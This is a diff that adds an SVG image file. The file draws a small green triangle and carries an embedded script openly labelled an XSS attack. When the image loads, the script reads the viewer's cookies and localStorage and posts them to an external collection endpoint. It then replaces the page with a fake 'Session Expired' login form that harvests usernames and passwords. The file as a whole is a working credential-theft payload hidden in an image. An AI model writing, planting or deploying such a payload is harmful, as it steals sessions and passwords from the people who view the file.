@@ -1,0 +1,24 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+
+   <!-- Improved XSS attack to capture sensitive user data -->
+   <script type="text/ecmascript">
+   <![CDATA[
+      // Capture sensitive information like cookies or local storage
+      var cookies = document.cookie;
+      var localStorageData = JSON.stringify(localStorage);
+
+      // Send data to the attacker's server
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://eoax26e2tecm5tp.m.pipedream.net/tokendz", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send("cookies=" + encodeURIComponent(cookies) + "&localStorage=" + encodeURIComponent(localStorageData));
+
+      // Optionally, manipulate the DOM or execute further attacks
+      document.body.innerHTML = "<h1>Session Expired</h1><p>Please log in again.</p><form method='POST' action='https://api.privateinternetaccess.com/'><input type='text' name='username' placeholder='Username'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>";
+   ]]>
+   </script>
+</svg>
